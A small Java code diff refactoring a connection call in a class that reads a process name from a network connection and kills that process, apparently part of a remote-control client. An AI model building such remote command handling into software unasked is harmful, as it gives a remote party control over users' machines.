@@ -8,7 +8,7 @@ public class Packet20KillProcess extends AbstractIncomingPacket {
 
 	@Override
 	public void read() throws Exception {
-		String process = Connection.readLine();
+		String process = Connection.instance.readLine();
 
 		try {
 			if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
